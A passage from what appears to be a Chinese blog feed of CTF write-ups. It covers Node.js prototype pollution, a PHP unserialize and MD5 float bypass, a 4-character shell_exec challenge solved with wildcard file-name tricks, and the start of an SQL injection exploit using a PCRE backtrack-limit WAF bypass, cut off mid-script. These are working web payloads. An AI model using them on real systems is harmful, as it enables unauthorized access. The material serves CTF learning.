rel="noopener">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p><p>文章里的poc没搞懂到底重写了啥，有没有重写，但是知道的是得从setFn()入手，直接跟进setFn()</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/8.png" class=""><p>可以看到，这里在访问/Privilege时，可以传入赋值key和value</p><p>下面就是跟进setFn()的第一个参数，这里可以看到session()，在app.js中有下面对Session的参数定义</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/9.png" class=""><p>这里有env，查一下意思就是环境变量，那么我们要污染的应该就是Session了，session又在环境变量中，这里就是一个重要点，先放着</p><p>下面再来看一下获取flag的条件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">"/DeveloperControlPanel"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    <span class="keyword">if</span> (req.body.key === <span class="literal">undefined</span> || req.body.password === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.send(<span class="string">"What's your problem?"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">"Wrong password!Are you Admin?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Admin[key]的值和password的值只要能够相等，就会给到在环境变量中的flag，这里</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Admin = &#123;</span><br><span class="line">    <span class="string">"password1"</span>:process.env.p1,</span><br><span class="line">    <span class="string">"password2"</span>:process.env.p2,</span><br><span class="line">    <span class="string">"password3"</span>:process.env.p3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Admin的定义也是在环境变量中，所以没办法用原型链污染覆盖，用上面分析的往环境变量中写入</p><p>又因为<strong>所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value</strong></p><p>所以我猜测污染session写入环境变量，在判断时找不到Admin中对应的值时会继续向前找，也就是前面提到的session，现在整个思路应该就清晰了，上poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Privilege</span><br><span class="line"></span><br><span class="line">POST：NewAttributeKey&#x3D;__proto__.peguin&amp;NewAttributeValue&#x3D;123</span><br></pre></td></tr></table></figure><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/10.png" class=""><p>可以看到成功写到了环境变量中，并且会生成新的键值对，我猜测应该是这种格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; __proto__: &#123; peguin: 123 &#125; &#125;</span><br></pre></td></tr></table></figure><p>y因为Admin本身没有这个属性，就会去<code>__proto__</code>中查找，所以接下来我们只要去post传参key为peguin，value为123就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;DeveloperControlPanel</span><br><span class="line"></span><br><span class="line">post：key&#x3D;peguin&amp;password&#x3D;123</span><br></pre></td></tr></table></figure><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/11.png" class=""><h2 id="Easytrick"><a href="#Easytrick" class="headerlink" title="Easytrick"></a>Easytrick</h2><p>这题没做出来挺遗憾的，赛后复现一点不难，之前接触过的点</p><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ul><li>整型和字符串精度问题</li></ul><h3 id="解题步骤-3"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题给源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (string)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"你太长了"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">'trick'</span>]);</span><br></pre></td></tr></table></figure><p>这里主要在本地测试，经过测试没有</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;trick1 &#x3D; (string)$this-&gt;trick1;</span><br></pre></td></tr></table></figure><p>这里就能用数组直接绕过，问题是多了这一个点，比赛时就没考虑到，赛后突然想到了之前这个考点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">1.000000000000001</span>;</span><br><span class="line">$b = <span class="number">1.000000000000001</span>;</span><br><span class="line">$a = (string)($a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(strlen($a)&gt;<span class="number">5</span>||strlen($b)&gt;<span class="number">5</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"you are too long"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> md5($a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>($a!==$b&amp;&amp;$a!=$b&amp;&amp;md5($a)==md5($b))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"good"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'no'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地测试</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/12.png" class=""><p>绕过了，直接编poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1=<span class="number">1.000000000000001</span>;</span><br><span class="line">    <span class="keyword">public</span> $trick2=<span class="number">1.000000000000001</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>把生成得数据传给trick就可以</p><img src="/2020/08/21/CISCN%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/13.png" class=""><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>知识点</p>]]></content>
      
      
      
        <tags>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NLcommand</title>
      <link href="/2020/08/18/NLcommand/"/>
      <url>/2020/08/18/NLcommand/</url>
      
        <content type="html"><![CDATA[<h2 id="【nl】难了"><a href="#【nl】难了" class="headerlink" title="【nl】难了"></a>【nl】难了<a id="more"></a></h2><p>开始这道题之前先来看点例子，看完就知道怎么做了</p><h3 id="nl命令"><a href="#nl命令" class="headerlink" title="nl命令"></a>nl命令</h3><p>nl命令其实就是linux下计算文件中的行号</p><img src="/2020/08/18/NLcommand/1.png" class=""><p>可以看到不单单返回了行号还返回了对应行号的内容</p><p>下面再来看一个小实验</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir tmp</span><br><span class="line">&gt;nl</span><br><span class="line">&gt;a.txt</span><br><span class="line">vim a.txt</span><br><span class="line">*</span><br></pre></td></tr></table></figure><img src="/2020/08/18/NLcommand/2.png" class=""><p>先将nl命令写入文件夹，这里用到了通配符<code>*</code>,会将文件夹下的第一个文件名当作bash命令来执行，其他文件名全部都是参数，通过写入nl，再写入测试的文件，调用通配符就能读取该路径下所有文件的行号及其内容，这道题也是这样</p><p>先来看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">4</span>)&#123;</span><br><span class="line">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"hack!!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//by Firebasky</span></span><br></pre></td></tr></table></figure><p>可以看到shell的长度不能超过4位，超过就会报hack</p><p>这里就用上面的方法，先写入<code>nl</code>，再用通配符读取即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?1&#x3D;&gt;nl</span><br><span class="line">?1&#x3D;*</span><br></pre></td></tr></table></figure><p>再源码处找到flag</p><img src="/2020/08/18/NLcommand/3.png" class=""><p>顺便回顾之前整理过的知识：</p><p>拓展：</p><p>思路：代替cat<br>cat 由第一行开始显示内容，并将所有内容输出</p><p>tac 从最后一行倒序显示内容，并将所有内容输出</p><p>more 根据窗口大小，一页一页的现实文件内容</p><p>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</p><p>head 只显示头几行</p><p>tail 只显示最后几行</p><p>nl 类似于cat -n，显示时输出行号</p><p>tailf 类似于tail -f</p><p>sort  命令用于将文本文件内容加以排序。</p><p>od  od指令会读取所给予的文件的内容，并将其内容以八进制字码呈现出来。</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASfinaltest</title>
      <link href="/2020/08/15/DASfinaltest/"/>
      <url>/2020/08/15/DASfinaltest/</url>
      
        <content type="html"><![CDATA[<h2 id="EZSQL"><a href="#EZSQL" class="headerlink" title="EZSQL"></a>EZSQL<a id="more"></a></h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>文件包含</li><li>SQL注入</li><li>php伪协议</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题，url处发现可能存在文件包含，用<code>filter://</code>协议尝试读取，成功，拿到源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"./bootstrap-4.0.0/favicon.ico"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ezsql<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"./bootstrap-4.0.0/dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"starter-template.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-expand-md navbar-dark bg-dark fixed-top"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>ezsql<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"navbar-toggler"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">"#navbarsExampleDefault"</span> <span class="attr">aria-controls</span>=<span class="string">"navbarsExampleDefault"</span> <span class="attr">aria-expanded</span>=<span class="string">"false"</span> <span class="attr">aria-label</span>=<span class="string">"Toggle navigation"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"navbar-toggler-icon"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collapse navbar-collapse"</span> <span class="attr">id</span>=<span class="string">"navbarsExampleDefault"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"navbar-nav mr-auto"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"./index.php"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item active"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"./file.php?file=list"</span>&gt;</span>List<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>(current)<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"dropdown-menu"</span> <span class="attr">aria-labelledby</span>=<span class="string">"dropdown01"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"dropdown-item"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Action<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"dropdown-item"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Another action<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"dropdown-item"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Something else here<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">main</span> <span class="attr">role</span>=<span class="string">"main"</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"starter-template"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>ezsql<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"lead"</span>&gt;</span>        </span><br><span class="line">        <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"sql.php"</span>)<span class="meta">?&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">main</span>&gt;</span><span class="comment">&lt;!-- /.container --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap core JavaScript</span></span><br><span class="line"><span class="comment">    ================================================== --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Placed at the end of the document so the pages load faster --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-3.2.1.slim.min.js"</span> <span class="attr">integrity</span>=<span class="string">"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">window.jQuery || document.write('<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./bootstrap-4.0.0/assets/js/vendor/jquery-slim.min.js"</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">\</span>/<span class="attr">script</span>&gt;</span>')</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./bootstrap-4.0.0/assets/js/vendor/popper.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./bootstrap-4.0.0/dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>前端代码，在这里面找到了包含的sql.php文件，读取sql.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$id=<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]) ? $_POST[<span class="string">'id'</span>] : <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/UNION.+?SELECT|\/\*.*\*\/|sleep|and|if|&amp;&amp;|\|\||\^|%|ascii|mid|left|greatest|least|substr|=|-|&lt;|&gt;|benchmark|like|in|between|regexp/is'</span>, $id)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'SQL Injection'</span>);</span><br><span class="line">&#125;</span><br><span class="line">mysqli_query($conn,<span class="string">"set names utf8"</span>);</span><br><span class="line">$sql=<span class="string">"select * from `ctf` where id ='"</span>.$id.<span class="string">"'"</span>;</span><br><span class="line">$result=mysqli_query($conn,$sql);</span><br><span class="line">$row=mysqli_fetch_row($result);</span><br><span class="line"><span class="keyword">if</span>($id==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='./img/1.png'&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($id==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;img src='./img/2.jpg'&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($id==<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;img src='./img/3.jpg'&gt;&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"what do you do?"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现常用的注入关键词都被过滤了，一些作用相同的关键词也被过滤，这里用到了p神一篇文章的知识来绕过WAF，利用PCRE回溯次数进行过滤，英文版的是100万次，<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://das.wetolink.com:44006/sql.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">"id"</span>:<span class="string">"0' union/*"</span> + <span class="string">"a"</span> * <span 